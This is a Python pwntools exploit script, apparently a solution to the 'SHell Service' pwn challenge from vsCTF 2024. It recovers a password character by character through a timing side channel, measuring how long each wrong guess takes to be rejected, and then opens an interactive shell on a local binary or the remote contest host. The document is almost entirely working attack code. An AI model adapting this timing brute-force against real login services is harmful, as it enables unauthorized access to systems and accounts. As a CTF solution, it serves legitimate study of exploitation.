#!/usr/bin/env python3
from pwn import *
import os
import string
import sys
import time

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/vsCTF 2024/pwn/SHell Service/shs')
elf = ELF(TARGET)
password = b''

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r, c):
    global password

    sent_time = time.time()

    r.sendlineafter(b':\n', (password + c).ljust(10, b'*'))

    if b'Wrong' in r.recvline():
        print(time.time() - sent_time)
        if time.time() - sent_time > 0.5 * len(password) + 1.4:
            password += c
            print(f'password: {password}')

        r.close()
        return

    r.interactive()
    return

while True:
    for c in string.printable:
        if __name__ == '__main__':
            if len(sys.argv) == 2 and sys.argv[1] == 'remote':
                REMOTE = True
                r = remote('vsc.tf', 7004)
            else:
                REMOTE = False
                r = process([TARGET,])

            exploit(r, c.encode())
